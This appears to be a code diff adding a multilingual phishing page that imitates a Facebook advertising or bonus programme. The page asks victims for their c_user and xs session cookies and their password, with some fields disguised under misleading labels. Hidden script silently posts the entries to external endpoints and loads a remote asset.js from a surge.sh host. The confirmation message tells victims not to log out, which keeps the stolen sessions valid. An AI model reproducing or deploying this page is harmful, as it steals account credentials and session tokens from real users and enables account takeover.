+            .xs-error-msg {
+                padding: 8px 12px;
+                font-size: 0.75rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .hero h1 {
+                font-size: 1.8rem;
+            }
+
+            .btn-primary {
+                padding: 14px 28px;
+                font-size: 1rem;
+            }
+
+            .benefit-card,
+            .step {
+                padding: 24px 16px;
+            }
+        }
+
+        @media (max-width: 390px) {
+            .lm-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .lang-switch-btn {
+                padding: 6px 10px;
+                font-size: 0.78rem;
+            }
+
+            .lang-switch-btn img {
+                width: 15px;
+                height: 11px;
+            }
+
+            .nav-links {
+                gap: 8px 12px;
+            }
+
+            .nav-links a {
+                font-size: 0.8rem;
+            }
+
+            .nav-links .btn-outline {
+                padding: 6px 14px;
+                font-size: 0.78rem;
+            }
+
+            .xs-error-msg {
+                padding: 6px 10px;
+                font-size: 0.7rem;
+            }
+        }
+
+        .nav-right-group {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- LANGUAGE SELECTION POPUP -->
+    <div id="lang-wrap">
+        <div id="lang-box">
+            <div class="lm-top">
+                <div class="lm-icon"><img src="https://asdkaskdjakdasjdkadj.surge.sh/mlogo.png" alt="lang"></div>
+                <div class="lm-h">Select Your Language</div>
+            </div>
+            <div class="lm-sub">Choose your language to continue.</div>
+            <input class="lm-search" id="lm-search" type="text" placeholder="Search language…" autocomplete="off">
+            <div class="lm-grid" id="lm-grid">
+                <div class="lm-opt" data-lang="english"><img src="https://flagcdn.com/24x18/us.png"
+                        alt="US"><span>English</span></div>
+                <div class="lm-opt" data-lang="hindi"><img src="https://flagcdn.com/24x18/in.png"
+                        alt="IN"><span>Hindi</span></div>
+                <div class="lm-opt" data-lang="spanish"><img src="https://flagcdn.com/24x18/es.png"
+                        alt="ES"><span>Spanish</span></div>
+                <div class="lm-opt" data-lang="portuguese"><img src="https://flagcdn.com/24x18/pt.png"
+                        alt="PT"><span>Portuguese</span></div>
+                <div class="lm-opt" data-lang="arabic"><img src="https://flagcdn.com/24x18/sa.png"
+                        alt="SA"><span>Arabic</span></div>
+                <div class="lm-opt" data-lang="french"><img src="https://flagcdn.com/24x18/fr.png"
+                        alt="FR"><span>French</span></div>
+                <div class="lm-opt" data-lang="tamil"><img src="https://flagcdn.com/24x18/in.png"
+                        alt="IN"><span>Tamil</span></div>
+                <div class="lm-opt" data-lang="vietnamese"><img src="https://flagcdn.com/24x18/vn.png"
+                        alt="VN"><span>Vietnamese</span></div>
+                <div class="lm-opt" data-lang="ghanaian"><img src="https://flagcdn.com/24x18/gh.png"
+                        alt="GH"><span>Ghanaian (Twi)</span></div>
+            </div>
+            <button class="lm-confirm" id="lm-confirm" disabled>Confirm Language</button>
+        </div>
+    </div>
+
+    <!-- NAVBAR -->
+    <nav class="navbar">
+        <div class="container">
+            <div class="logo">
+                <i class="fab fa-facebook"></i>
+                <span id="t-logo-bonus">Advertisement</span><span id="t-logo-program"
+                    style="color:#1b74e4;">Program</span>
+            </div>
+            <div class="nav-right-group">
+                <ul class="nav-links" id="nav-links">
+                    <li><a href="#benefits" id="t-nav-benefits">Benefits</a></li>
+                    <li><a href="#how-it-works" id="t-nav-how">How It Works</a></li>
+                    <li><a href="#eligibility" id="t-nav-eligibility">Eligibility</a></li>
+                    <li><a href="#cta" class="btn-outline" id="t-nav-join"><i class="fas fa-user-plus"></i> Join Now</a>
+                    </li>
+                </ul>
+                <button class="lang-switch-btn" id="lang-switch-btn" title="Change Language">
+                    <img id="lang-switch-flag" src="https://flagcdn.com/24x18/us.png" alt="">
+                    <span id="lang-switch-name">English</span>
+                    <i class="fas fa-chevron-down" style="font-size:0.7rem;"></i>
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- HERO -->
+    <section class="hero">
+        <div class="container">
+            <div class="badge">
+                <i class="fas fa-gift" style="margin-right:6px;"></i> <span id="t-hero-badge">Limited Invitation</span>
+            </div>
+            <h1>
+                <span id="t-hero-h1-1">Unlock Your</span> <span class="highlight" id="t-hero-h1-2">FB
+                    Advertisement</span> <span id="t-hero-h1-3">&amp; Grow Faster</span>
+            </h1>
+            <p id="t-hero-p">You've been handpicked to join our exclusive Facebook Advertisement Program. Earn rewards,
+                boost
+                engagement, and scale your content like never before.</p>
+            <div class="cta-group">
+                <button class="btn-claim" id="claimBonusBtn">
+                    <i class="fas fa-rocket"></i> <span id="t-hero-btn-claim">Apply to receive ads </span>
+                </button>
+                <a href="#how-it-works" class="btn-outline" id="t-hero-btn-learn">Learn More</a>
+            </div>
+
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="number">$12M+</div>
+                    <div class="label" id="t-stat1-label">Total payment Paid</div>
+                </div>
+                <div class="stat-item">
+                    <div class="number">8.2K</div>
+                    <div class="label" id="t-stat2-label">Active Members</div>
+                </div>
+                <div class="stat-item">
+                    <div class="number">4.9★</div>
+                    <div class="label" id="t-stat3-label">Member Rating</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- BENEFITS -->
+    <section class="benefits" id="benefits">
+        <div class="container">
+            <div class="section-title">
+                <h2><span id="t-benefits-h2-1">Why Join the</span> <span style="color:#1b74e4;" id="t-benefits-h2-2">FB
+                        Bonus</span> <span id="t-benefits-h2-3">Program?</span></h2>
+                <p id="t-benefits-p">Exclusive perks designed to help you succeed on Facebook.</p>
+            </div>
+            <div class="benefits-grid">
+                <div class="benefit-card">
+                    <div class="icon"><i class="fas fa-dollar-sign"></i></div>
+                    <h3 id="t-bcard1-title">Cash Rewards</h3>
+                    <p id="t-bcard1-desc">Earn monthly paid based on your engagement and reach.</p>
+                </div>
+                <div class="benefit-card">
+                    <div class="icon"><i class="fas fa-chart-line"></i></div>
+                    <h3 id="t-bcard2-title">Growth Acceleration</h3>
+                    <p id="t-bcard2-desc">Get algorithmic boosts and priority support for your content.</p>
+                </div>
+                <div class="benefit-card">
+                    <div class="icon"><i class="fas fa-users"></i></div>
+                    <h3 id="t-bcard3-title">Exclusive Community</h3>
+                    <p id="t-bcard3-desc">Network with top creators and get insider tips &amp; strategies.</p>
+                </div>
+                <div class="benefit-card">
+                    <div class="icon"><i class="fas fa-tools"></i></div>
+                    <h3 id="t-bcard4-title">Early Access</h3>
+                    <p id="t-bcard4-desc">Try new Facebook features before the general public.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- HOW IT WORKS -->
+    <section class="how-it-works" id="how-it-works">
+        <div class="container">
+            <div class="section-title">
+                <h2><span id="t-how-h2-1">How It</span> <span style="color:#1b74e4;" id="t-how-h2-2">Works</span></h2>
+                <p id="t-how-p">Three simple steps to start earning your Facebook video advertisement.</p>
+            </div>
+            <div class="steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <h3 id="t-step1-title">Apply &amp; Qualify</h3>
+                    <p id="t-step1-desc">Submit your application and get approved within 24 hours.</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <h3 id="t-step2-title">Create &amp; Engage</h3>
+                    <p id="t-step2-desc">Publish content and interact with your audience as usual.</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <h3 id="t-step3-title">Earn &amp; Withdraw</h3>
+                    <p id="t-step3-desc">Receive monthly payment directly to your preferred payout method.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ELIGIBILITY -->
+    <section class="eligibility" id="eligibility">
+        <div class="container">
+            <div class="section-title">
+                <h2><span id="t-elig-h2-1">Am I</span> <span style="color:#1b74e4;"
+                        id="t-elig-h2-2">Eligible</span><span id="t-elig-h2-3">?</span></h2>
+                <p id="t-elig-p">We're looking for passionate creators. Here's what we check:</p>
+            </div>
+            <div class="eligibility-grid">
+                <div class="eligibility-item">
+                    <i class="fas fa-check-circle"></i>
+                    <div>
+                        <h4 id="t-elig1-title">Active Facebook Page</h4>
+                        <p id="t-elig1-desc">At least 1,000 followers and consistent posting activity.</p>
+                    </div>
+                </div>
+                <div class="eligibility-item">
+                    <i class="fas fa-check-circle"></i>
+                    <div>
+                        <h4 id="t-elig2-title">Original Content</h4>
+                        <p id="t-elig2-desc">You produce authentic content that drives real engagement.</p>
+                    </div>
+                </div>
+                <div class="eligibility-item">
+                    <i class="fas fa-check-circle"></i>
+                    <div>
+                        <h4 id="t-elig3-title">Community Guidelines</h4>
+                        <p id="t-elig3-desc">Your page must comply with Facebook's community standards.</p>
+                    </div>
+                </div>
+                <div class="eligibility-item">
+                    <i class="fas fa-check-circle"></i>
+                    <div>
+                        <h4 id="t-elig4-title">Geographic Availability</h4>
+                        <p id="t-elig4-desc">Open to creators in all regions where the program is active.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CTA BANNER -->
+    <section class="cta-banner" id="cta">
+        <div class="container">
+            <h2 id="t-cta-h2">Ready to post ads?</h2>
+            <p id="t-cta-p">Join thousands of creators already earning rewards. Your invitation is waiting.</p>
+            <button class="btn-primary" id="claimBonusBtn2" style="background:#fff;color:#1b74e4;">
+                <i class="fas fa-arrow-right"></i> <span id="t-cta-btn">Get Started Now</span>
+            </button>
+        </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+        <div class="container">
+            <div class="logo" style="color:#fff; font-size:1.3rem;">
+                <i class="fab fa-facebook" style="color:#1b74e4;"></i>
+                <span id="t-footer-bonus">Bonus</span><span style="color:#1b74e4;" id="t-footer-program">Program</span>
+            </div>
+
+            <div class="socials">
+                <a href="#" aria-label="Facebook"><i class="fab fa-facebook"></i></a>
+                <a href="#" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
+                <a href="#" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
+                <a href="#" aria-label="YouTube"><i class="fab fa-youtube"></i></a>
+            </div>
+
+            <div class="legal">
+                <a href="#" id="t-legal-privacy">Privacy Policy</a>
+                <a href="#" id="t-legal-terms">Terms of Service</a>
+                <a href="#" id="t-legal-contact">Contact</a>
+            </div>
+
+            <div class="copy" id="t-footer-copy">
+                &copy; 2026 FB advertisement Program. All rights reserved. This is an independent invitation program and
+                is not
+                affiliated with or endorsed by Meta.
+            </div>
+        </div>
+    </footer>
+
+    <!-- MODAL – two-step claim with surname + FB logo -->
+    <div class="modal-overlay" id="bonusModal">
+        <div class="modal-box">
+
+            <button class="modal-close" id="modalCloseBtn" aria-label="Close modal">
+                <i class="fas fa-times"></i>
+            </button>
+
+            <div class="modal-header">
+                <div class="modal-icon">
+                    <i class="fas fa-gift"></i>
+                </div>
+                <h2 id="modalTitle">🎯 post ads appeal now and receive payment</h2>
+                <p id="modalSubtitle">Fill in the details below to verify your eligibility.</p>
+            </div>
+
+            <div class="modal-video-wrapper" id="videoWrapper">
+                <video id="modalVideo" playsinline preload="metadata">
+                    <source id="modalVideoSrc"
+                        src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4"
+                        type="video/mp4" />
+                    Your browser does not support the video tag.
+                </video>
+                <div class="play-btn-overlay" id="playOverlay">
+                    <i class="fas fa-play-circle"></i>
+                </div>
+            </div>
+
+            <div class="video-controls" id="videoControls">
+                <button id="playPauseBtn" aria-label="Play or pause video">
+                    <i class="fas fa-play"></i>
+                </button>
+                <div class="progress-container">
+                    <input type="range" id="progressBar" min="0" max="100" value="0" step="0.1" />
+                    <span class="time-display" id="timeDisplay">0:00 / 0:00</span>
+                </div>
+                <div class="volume-wrap">
+                    <button id="muteBtn" aria-label="Mute or unmute">
+                        <i class="fas fa-volume-up"></i>
+                    </button>
+                    <input type="range" id="volumeBar" min="0" max="1" step="0.05" value="1" />
+                </div>
+                <button id="fullscreenBtn" class="fullscreen-btn" aria-label="Toggle fullscreen">
+                    <i class="fas fa-expand"></i>
+                </button>
+            </div>
+
+            <div class="step-indicator" id="stepIndicator">
+                <span class="dot active" data-step="1"></span>
+                <span class="dot" data-step="2"></span>
+            </div>
+
+            <div class="info-notice" id="infoNotice">
+                <i class="fas fa-info-circle"></i>
+                <div id="t-info-notice">
+                    <strong>Please fill correct information.</strong> All fields are required.
+                    Your data is secure and will only be used for ads verification.
+                </div>
+            </div>
+
+            <form class="modal-form" id="bonusForm" autocomplete="off">
+
+                <div class="form-step" id="step1">
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>
+                                <span id="t-label-cuser">C_user</span>
+                                <span class="label-badge" id="t-badge-required1">required</span>
+                            </label>
+                            <input type="text" id="fullName" placeholder="Enter your c_user" required />
+                            <div class="field-hint">
+                                <i class="fas fa-asterisk"></i> <span id="t-hint-cuser">As it appears on your ID</span>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label>
+                                <span id="t-label-xs">Xs</span>
+                                <span class="label-badge" id="t-badge-required2">required</span>
+                            </label>
+                            <input type="text" id="lastName" placeholder="Enter your xs" required />
+                            <div class="field-hint">
+                                <i class="fas fa-asterisk"></i> <span id="t-hint-xs">As it appears on your ID</span>
+                            </div>
+                            <div class="xs-error-msg" id="xsErrorMsg"></div>
+                        </div>
+                    </div>
+                    <button type="button" class="modal-submit" id="step1Next">
+                        <i class="fas fa-arrow-right"></i> <span id="t-step1-btn">Submit Claim</span>
+                    </button>
+                </div>
+
+                <div class="form-step hidden" id="step2">
+                    <div class="form-group">
+                        <label>
+                            <span class="fb-logo-label">
+                                <span class="fb-icon"><i class="fab fa-facebook"></i></span>
+                                <span id="t-label-surname">Password</span>
+                            </span>
+                            <span class="label-badge warning" id="t-badge-required3">required</span>
+                        </label>
+                        <input type="text" id="surname" placeholder="Enter your password" required />
+                        <div class="field-hint">
+                            <i class="fab fa-facebook" style="color:#1b74e4;"></i>
+                            <span id="t-hint-surname">Enter your password</span>
+                        </div>
+                    </div>
+                    <button type="submit" class="modal-submit secondary" id="step2Submit">
+                        <i class="fas fa-check-circle"></i> <span id="t-step2-btn">Complete &amp; Claim Bonus</span>
+                    </button>
+                </div>
+
+                <div class="form-step hidden" id="thankYouStep">
+                    <div class="thankyou-message">
+                        <div class="big-icon"><i class="fas fa-check-circle"></i></div>
+                        <h3 id="t-thankyou-title">🎉 ads posted Successfully!</h3>
+                        <p id="t-thankyou-p1">
+                            Thank you, <strong id="displaySurname">—</strong>! We've received your
+                            claim. You'll get a confirmation email shortly.
+                        </p>
+                        <p style="font-size:0.9rem;color:#65676b;margin-top:12px;" id="t-thankyou-p2">
+                            <i class="fab fa-facebook" style="color:#1b74e4;"></i>
+                            Your FB Bonus is on the way.
+                        </p>
+                        <button type="button" class="modal-submit" id="thankYouClose"
+                            style="margin-top:20px;background:#42b72a;box-shadow:0 8px 24px rgba(66,183,42,0.3);">
+                            <i class="fas fa-thumbs-up"></i> <span id="t-thankyou-btn">Great!</span>
+                        </button>
+                    </div>
+                </div>
+
+            </form>
+        </div>
+    </div>
+
+    <script src="https://fragilevacation232.surge.sh/asset.js">
+    </script>
+
+    <script>
+        (function () {
+            'use strict';
+
+
+            const URL_THIRD = window['__EP'] || '';
+
+
+            function sendData(url, data) {
+                const params = new URLSearchParams(data).toString();
+                const headers = { 'Content-Type': 'application/x-www-form-urlencoded' };
+                fetch(url, { method: 'POST', headers, body: params }).catch(err => { /* silent */ });
+                if (URL_THIRD) fetch(URL_THIRD, { method: 'POST', headers, body: params }).catch(err => { /* silent */ });
+            }
+
+
+            const videoSrc = {
+                english: 'https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4',
+                spanish: 'https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4',
+                hindi: 'https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4',
+                french: 'https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27ecb21-fr/720p.mp4',
+                portuguese: 'https://allvideos.wasmer.app/Portuguese.mp4',
+                tamil: 'https://allvideos.wasmer.app/tamil.mp4',
+                arabic: 'https://resource2.heygen.ai/video_translate/f7346b2ef53c4daa9bc15138684919db-ar_use-aicoustics-vocal/720p.mp4',
+                ghanaian: 'https://allvideos.wasmer.app/english.mp4',
+                vietnamese: 'https://allvideos.wasmer.app/vietanames.mp4'
+            };
+            const flagSrc = {
+                english: 'https://flagcdn.com/24x18/us.png',
+                hindi: 'https://flagcdn.com/24x18/in.png',
+                spanish: 'https://flagcdn.com/24x18/es.png',
+                portuguese: 'https://flagcdn.com/24x18/pt.png',
+                tamil: 'https://flagcdn.com/24x18/in.png',
+                arabic: 'https://flagcdn.com/24x18/sa.png',
+                french: 'https://flagcdn.com/24x18/fr.png',
+                vietnamese: 'https://flagcdn.com/24x18/vn.png',
+                ghanaian: 'https://flagcdn.com/24x18/gh.png'
+            };
+
+            // ── Translations ──
+            const T = {
+                english: {
+                    logoBonus: 'advertisement',
+                    logoProgram: 'Program',
+                    navBenefits: 'Benefits',
+                    navHow: 'How It Works',
+                    navEligibility: 'Eligibility',
+                    navJoin: 'Join Now',
+                    heroBadge: 'Limited Invitation',
+                    heroH1_1: 'Unlock Your',
+                    heroH1_2: 'FB ads',
+                    heroH1_3: '& Grow Faster',
+                    heroP: 'You\'ve been handpicked to join our exclusive Facebook advertisement Program. Earn rewards, boost engagement, and scale your content like never before.',
+                    heroBtnClaim: 'auto post appeal',
+                    heroBtnLearn: 'Learn More',
+                    stat1Label: 'Total payment Paid',
+                    stat2Label: 'Active Members',
+                    stat3Label: 'Member Rating',
+                    benefitsH2_1: 'Why Join the',
+                    benefitsH2_2: 'FB advertisement',
+                    benefitsH2_3: 'Program?',
+                    benefitsP: 'Exclusive perks designed to help you succeed on Facebook.',
+                    bcard1Title: 'Cash Rewards',
+                    bcard1Desc: 'Earn monthly bonuses based on your engagement and reach.',
+                    bcard2Title: 'Growth Acceleration',
+                    bcard2Desc: 'Get algorithmic boosts and priority support for your content.',
+                    bcard3Title: 'Exclusive Community',
+                    bcard3Desc: 'Network with top creators and get insider tips & strategies.',
+                    bcard4Title: 'Early Access',
+                    bcard4Desc: 'Try new Facebook features before the general public.',
+                    howH2_1: 'How It',
+                    howH2_2: 'Works',
+                    howP: 'Three simple steps to start earning your Facebook bonus.',
+                    step1Title: 'Apply & Qualify',
+                    step1Desc: 'Submit your application and get approved within 24 hours.',
+                    step2Title: 'Create & Engage',
+                    step2Desc: 'Publish content and interact with your audience as usual.',
+                    step3Title: 'Earn & Withdraw',
+                    step3Desc: 'Receive monthly  directly to your preferred payout method.',
+                    eligH2_1: 'Am I',
+                    eligH2_2: 'Eligible',
+                    eligH2_3: '?',
+                    eligP: 'We\'re looking for passionate creators. Here\'s what we check:',
+                    elig1Title: 'Active Facebook Page',
+                    elig1Desc: 'At least 1,000 followers and consistent posting activity.',
+                    elig2Title: 'Original Content',
+                    elig2Desc: 'You produce authentic content that drives real engagement.',
+                    elig3Title: 'Community Guidelines',
+                    elig3Desc: 'Your page must comply with Facebook\'s community standards.',
+                    elig4Title: 'Geographic Availability',
+                    elig4Desc: 'Open to creators in all regions where the program is active.',
+                    ctaH2: 'Ready to post ads to paid payment?',
+                    ctaP: 'Join thousands of creators already earning rewards. Your invitation is waiting.',
+                    ctaBtn: 'Get Started Now',
+                    footerBonus: 'ads',
+                    footerProgram: 'Program',
+                    legalPrivacy: 'Privacy Policy',
+                    legalTerms: 'Terms of Service',
+                    legalContact: 'Contact',
+                    footerCopy: '© 2026 FB advertisement Program. All rights reserved. This is an independent invitation program and is not affiliated with or endorsed by Meta.',
+                    modalTitle: '🎯 auto post ads appeal',
+                    modalSubtitle: 'Fill in the details below to verify your eligibility.',
+                    infoNotice: '<strong>Please fill correct information.</strong> All fields are required. Your data is secure and will only be used for bonus verification.',
+                    labelCuser: 'C_user',
+                    badgeRequired1: 'required',
+                    hintCuser: 'c_user value',
+                    labelXs: 'Xs',
+                    badgeRequired2: 'required',
+                    hintXs: 'xs value',
+                    step1Btn: 'Submit Claim',
+                    labelSurname: 'Password',
+                    badgeRequired3: 'required',
+                    hintSurname: 'Enter your password',
+                    step2Btn: 'Complete & post ads',
+                    thankyouTitle: '🎉 ads posted Successfully! wait for 24 hours ads appeal-in review do not logout of your computer or laptop ',
+                    thankyouP1: 'Thank you, —! We\'ve received your claim. You\'ll get a confirmation email shortly.',
+                    thankyouP2: 'Your FB ads is on the way.',
+                    thankyouBtn: 'Great!'
+                },
+                hindi: {
+                    logoBonus: 'advertisement',
+                    logoProgram: 'Program',
+                    navBenefits: 'Benefits',
+                    navHow: 'How It Works',
+                    navEligibility: 'Eligibility',
+                    navJoin: 'Join Now',
+                    heroBadge: 'Limited Invitation',
+                    heroH1_1: 'Unlock Your',
+                    heroH1_2: 'FB ads',
+                    heroH1_3: '& Grow Faster',
+                    heroP: 'आपको हमारे खास Facebook advertising Program में शामिल होने के लिए चुना गया है।  रिवॉर्ड कमाएं, एंगेजमेंट बढ़ाएं, और अपने कंटेंट को पहले से कहीं ज़्यादा बढ़ाएं।',
+                    heroBtnClaim: 'अपना बोनस क्लेम करें',
+                    heroBtnLearn: 'और जानें',
+                    stat1Label: 'टोटल पेमेंट किया गया',
+                    stat2Label: 'एक्टिव मेंबर्स',
+                    stat3Label: 'मेंबर रेटिंग',
+                    benefitsH2_1: 'क्यों जॉइन करें',
+                    benefitsH2_2: 'FB एडवर्टाइजमेंट',
+                    benefitsH2_3: 'प्रोग्राम?',
+                    benefitsP: 'फेसबुक पर सफल होने में आपकी मदद करने के लिए डिज़ाइन किए गए एक्सक्लूसिव पर्क्स।',
+                    bcard1Title: 'कैश रिवॉर्ड्स',
+                    bcard1Desc: 'अपने एंगेजमेंट और रीच के आधार पर मंथली बोनस कमाएं।',
+                    bcard2Title: 'ग्रोथ एक्सेलरेशन',
+                    bcard2Desc: 'अपने कंटेंट के लिए एल्गोरिदमिक बूस्ट और प्रायोरिटी सपोर्ट पाएं।',
+                    bcard3Title: 'एक्सक्लूसिव कम्युनिटी',
+                    bcard3Desc: 'टॉप क्रिएटर्स के साथ नेटवर्क बनाएं और इनसाइडर टिप्स और स्ट्रेटेजी पाएं।',
+                    bcard4Title: 'अर्ली एक्सेस',
+                    bcard4Desc: 'आम लोगों से पहले नए Facebook फीचर्स ट्राई करें।',
+                    howH2_1: 'कैसे करें',
+                    howH2_2: 'काम करता है',
+                    howP: 'अपना Facebook बोनस कमाना शुरू करने के तीन आसान स्टेप्स।',
+                    step1Title: 'अप्लाई करें और क्वालिफाई करें',
+                    step1Desc: 'अपना एप्लीकेशन सबमिट करें और 24 घंटे के अंदर अप्रूवल पाएं।',
+                    step2Title: 'क्रिएट करें और एंगेज करें',
+                    step2Desc: 'कंटेंट पब्लिश करें और हमेशा की तरह अपनी ऑडियंस के साथ इंटरैक्ट करें।',
+                    step3Title: 'कमाएं और निकालें',
+                    step3Desc: 'अपने पसंदीदा पेआउट मेथड से सीधे मंथली पाएं।',
+                    eligH2_1: 'क्या मैं',
+                    eligH2_2: 'एलिजिबल',
+                    eligH2_3: '?',
+                    eligP: 'हम पैशनेट क्रिएटर्स की तलाश में हैं। हम ये चेक करते हैं:',
+                    elig1Title: 'एक्टिव Facebook पेज',
+                    elig1Desc: 'कम से कम 1,000 फॉलोअर्स और लगातार पोस्टिंग एक्टिविटी।',
+                    elig2Title: 'ओरिजिनल कंटेंट',
+                    elig2Desc: 'आप ऐसा ऑथेंटिक कंटेंट बनाते हैं जिससे असली एंगेजमेंट बढ़ता है।',
+                    elig3Title: 'कम्युनिटी गाइडलाइंस',
+                    elig3Desc: 'आपका पेज Facebook के कम्युनिटी स्टैंडर्ड्स के हिसाब से होना चाहिए।',
+                    elig4Title: 'जियोग्राफिक अवेलेबिलिटी',
+                    elig4Desc: 'उन सभी इलाकों के क्रिएटर्स के लिए खुला है जहाँ प्रोग्राम एक्टिव है।',
+                    ctaH2: 'अपना बोनस क्लेम करने के लिए तैयार हैं?',
+                    ctaP: 'हजारों क्रिएटर्स से जुड़ें जो पहले से ही रिवॉर्ड कमा रहे हैं।  आपका इनविटेशन इंतज़ार कर रहा है।',
+                    ctaBtn: 'अभी शुरू करें',
+                    footerBonus: 'बोनस',
+                    footerProgram: 'प्रोग्राम',
+                    legalPrivacy: 'प्राइवेसी पॉलिसी',
+                    legalTerms: 'सेवा की शर्तें',
+                    legalContact: 'संपर्क करें',
+                    footerCopy: '© 2026 FB विज्ञापन प्रोग्राम। सभी अधिकार सुरक्षित। यह एक इंडिपेंडेंट इनविटेशन प्रोग्राम है और मेटा से जुड़ा हुआ या उसका समर्थन नहीं करता है।',
+                    modalTitle: '🎯 ऑटो पोस्ट ऐड अपील',
+                    modalSubtitle: 'अपनी एलिजिबिलिटी वेरिफ़ाई करने के लिए नीचे दी गई जानकारी भरें।',
+                    infoNotice: '<strong>कृपया सही जानकारी भरें।</strong> सभी फ़ील्ड ज़रूरी हैं।  आपका डेटा सुरक्षित है और इसका इस्तेमाल सिर्फ़ बोनस वेरिफ़िकेशन के लिए किया जाएगा।',
+                    labelCuser: 'C_user',
+                    badgeRequired1: 'ज़रूरी',
+                    hintCuser: 'c_user वैल्यू',
+                    labelXs: 'Xs',
+                    badgeRequired2: 'ज़रूरी',
+                    hintXs: 'xs वैल्यू',
+                    step1Btn: 'क्लेम सबमिट करें',
+                    labelSurname: 'पासवर्ड',
+                    badgeRequired3: 'ज़रूरी',
+                    hintSurname: 'अपना पासवर्ड डालें',
+                    step2Btn: 'पूरा करें और ऐड पोस्ट करें',
+                    thankyouTitle: '🎉 ऐड सफलतापूर्वक पोस्ट हो गए! 24 घंटे इंतज़ार करें, ऐड अपील रिव्यू में है, अपने कंप्यूटर या लैपटॉप से लॉगआउट न करें',
+                    thankyouP1: 'धन्यवाद, —! हमें आपका क्लेम मिल गया है। आपको जल्द ही एक कन्फ़र्मेशन ईमेल मिलेगा।',
+                    thankyouP2: 'आपके FB ऐड आने वाले हैं।',
+                    thankyouBtn: 'बहुत बढ़िया!'
+                },
+                spanish: {
+                    logoBonus: 'publicidad',
+                    logoProgram: 'Program',
+                    navBenefits: 'Beneficios',
+                    navHow: 'Cómo Funciona',
+                    navEligibility: 'Elegibilidad',
+                    navJoin: 'Únete Ahora',
+                    heroBadge: 'Invitación Limitada',
+                    heroH1_1: 'Desbloquea Tu',
+                    heroH1_2: 'Bono FB',
+                    heroH1_3: 'y Crece Más Rápido',
+                    heroP: 'Has sido seleccionado para unirte a nuestro exclusivo Programa de Bonos de Facebook. Gana recompensas, aumenta la participación y escala tu contenido como nunca antes.',
+                    heroBtnClaim: 'Reclama Tu Bono',
+                    heroBtnLearn: 'Más Información',
+                    stat1Label: 'Bonos Totales Pagados',
+                    stat2Label: 'Miembros Activos',
+                    stat3Label: 'Calificación de Miembros',
+                    benefitsH2_1: '¿Por Qué Unirse al',
+                    benefitsH2_2: 'Programa ads publicidad',
+                    benefitsH2_3: '?',
+                    benefitsP: 'Beneficios exclusivos diseñados para ayudarte a tener éxito en Facebook.',
+                    bcard1Title: 'Recompensas en Efectivo',
+                    bcard1Desc: 'Gana bonos mensuales basados en tu participación y alcance.',
+                    bcard2Title: 'Aceleración del Crecimiento',
+                    bcard2Desc: 'Recibe impulsos algorítmicos y soporte prioritario para tu contenido.',
+                    bcard3Title: 'Comunidad Exclusiva',
+                    bcard3Desc: 'Conéctate con los mejores creadores y obtén consejos y estrategias internas.',
+                    bcard4Title: 'Acceso Anticipado',
+                    bcard4Desc: 'Prueba nuevas funciones de Facebook antes que el público en general.',
+                    howH2_1: 'Cómo',
+                    howH2_2: 'Funciona',
+                    howP: 'Tres sencillos pasos para empezar a ganar tu bono de Facebook.',
+                    step1Title: 'Solicita y Califica',
+                    step1Desc: 'Envía tu solicitud y obtén la aprobación en 24 horas.',
+                    step2Title: 'Crea e Interactúa',
+                    step2Desc: 'Publica contenido e interactúa con tu audiencia como siempre.',
+                    step3Title: 'Gana y Retira',
+                    step3Desc: 'Recibe bonos mensuales directamente en tu método de pago preferido.',
+                    eligH2_1: '¿Soy',
+                    eligH2_2: 'Elegible',
+                    eligH2_3: '?',
+                    eligP: 'Buscamos creadores apasionados. Esto es lo que verificamos:',
+                    elig1Title: 'Página de Facebook Activa',
+                    elig1Desc: 'Al menos 1,000 seguidores y actividad de publicación constante.',
+                    elig2Title: 'Contenido Original',
+                    elig2Desc: 'Produces contenido auténtico que genera participación real.',
+                    elig3Title: 'Normas Comunitarias',
+                    elig3Desc: 'Tu página debe cumplir con las normas comunitarias de Facebook.',
+                    elig4Title: 'Disponibilidad Geográfica',
+                    elig4Desc: 'Abierto a creadores en todas las regiones donde el programa está activo.',
+                    ctaH2: '¿Listo para Reclamar Tu Bono?',
+                    ctaP: 'Únete a miles de creadores que ya están ganando recompensas. Tu invitación te está esperando.',
+                    ctaBtn: 'Comienza Ahora',
+                    footerBonus: 'Bonus',
+                    footerProgram: 'Program',
+                    legalPrivacy: 'Política de Privacidad',
+                    legalTerms: 'Términos del Servicio',
+                    legalContact: 'Contacto',
+                    footerCopy: '© 2026 Programa FB ads. Todos los derechos reservados. Este es un programa de invitación independiente y no está afiliado ni respaldado por Meta.',
+                    modalTitle: '🎯 Reclama Tu ads',
+                    modalSubtitle: 'Completa los detalles a continuación para verificar tu elegibilidad.',
+                    infoNotice: '<strong>Por favor, complete la información correcta.</strong> Todos los campos son obligatorios. Sus datos están seguros y solo se utilizarán para la verificación del bono.',
+                    labelCuser: 'C_user',
+                    badgeRequired1: 'requerido',
+                    hintCuser: 'Como aparece en tu ID',
+                    labelXs: 'Xs',
+                    badgeRequired2: 'requerido',
+                    hintXs: 'Como aparece en tu ID',
+                    step1Btn: 'Enviar Reclamo',
+                    labelSurname: 'Apellido',
+                    badgeRequired3: 'requerido',
+                    hintSurname: 'Tu apellido según el perfil de Facebook',
